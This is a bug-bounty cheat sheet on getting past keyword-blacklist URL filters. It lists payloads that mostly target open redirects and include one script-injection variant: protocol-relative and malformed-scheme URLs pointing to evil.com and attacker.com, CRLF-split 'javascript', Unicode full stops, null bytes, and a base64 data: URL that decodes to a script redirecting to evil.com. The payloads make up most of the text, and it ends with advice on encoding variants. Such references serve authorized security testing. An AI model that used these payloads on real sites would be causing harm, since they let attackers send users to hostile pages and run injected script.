# Blacklist/Keyword Filters & Browser Autocorrect

## Keyword blacklist bypasses

Filters that block on literal substrings (`http://`, `//`, a specific domain keyword) rather than parsing the URL structurally are consistently the weakest form of protection.

```
java%0d%0ascript%0d%0a:alert(0)      -> defeats a "javascript" substring filter
//evil.com                            -> defeats a "http://" filter (protocol-relative URL)
////evil.com                          -> same, extra slashes tolerated by browsers
https:evil.com                        -> defeats a "//" filter
\/\/evil.com/                         -> defeats a "//" filter (escaped-looking slashes)
/\/evil.com/
evil。com                             -> U+3002 ideographic full stop, defeats a "." filter
//evil%E3%80%82com                    -> same idea, percent-encoded
//evil%00.com                         -> null byte injection
evil.example%00
%09//evil.example                     -> tab character before scheme-relative URL
```

## Browser autocorrect tricks

Modern browsers (Chrome in particular) silently repair malformed scheme syntax into a working URL. This defeats filters looking for the literal string `http://` or `https://`.

```
https:attacker.com
https;attacker.com
https:\/\/attacker.com
https:/\/\attacker.com
https:\\attacker.com
```

## Data URL scheme bypass

If a filter only checks for `http`/`https` literals, the `data:` scheme sidesteps it entirely — a base64-encoded HTML payload can carry its own redirect logic:

```
data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9ldmlsLmNvbSI8L3NjcmlwdD4=
```

Decodes to:
```html
<script>location="https://evil.com"</script>
```

## Testing tip

Never assume a blacklist is checking the fully-decoded, fully-normalized form of your input. Test raw, single-encoded, and double-encoded forms of every payload against every filter you encounter.

## Source

Bug Bounty Bootcamp, ch. 7 (Vickie Li); PayloadsAllTheThings — Open Redirect; HackTricks
